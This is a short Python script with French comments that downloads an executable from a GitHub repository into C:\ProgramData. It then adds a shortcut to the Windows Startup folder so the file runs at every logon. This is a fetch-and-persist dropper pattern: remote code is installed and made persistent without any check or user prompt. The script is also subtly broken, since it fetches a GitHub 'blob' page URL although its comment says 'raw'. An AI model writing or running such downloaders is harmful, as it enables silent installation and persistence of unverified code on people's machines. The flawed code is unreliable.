import os
import requests
from pathlib import Path
import shutil
import pythoncom
from win32com.shell import shell

# URL du fichier .exe sur GitHub (raw)
github_url = "https://github.com/Satanas1275/tkt/blob/main/main.exe"

# Dossier de destination générique
destination_dir = Path(r"C:\ProgramData\MonProgramme")
destination_dir.mkdir(parents=True, exist_ok=True)
destination = destination_dir / "main.exe"

# Télécharger le fichier depuis GitHub
response = requests.get(github_url, stream=True)
if response.status_code == 200:
    with open(destination, 'wb') as f:
        shutil.copyfileobj(response.raw, f)
    print(f"Fichier téléchargé dans {destination}")
else:
    print("Erreur lors du téléchargement :", response.status_code)

# Créer un raccourci dans le dossier de démarrage
startup_folder = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
shortcut_path = startup_folder / "MonProgramme.lnk"

shell_link = pythoncom.CoCreateInstance(
    shell.CLSID_ShellLink, None,
    pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
)
shell_link.SetPath(str(destination))
shell_link.SetWorkingDirectory(str(destination.parent))
shell_link.SetDescription("Mon programme au démarrage")

persist_file = shell_link.QueryInterface(pythoncom.IID_IPersistFile)
persist_file.Save(str(shortcut_path), 0)

print(f"Raccourci créé dans {startup_folder}")
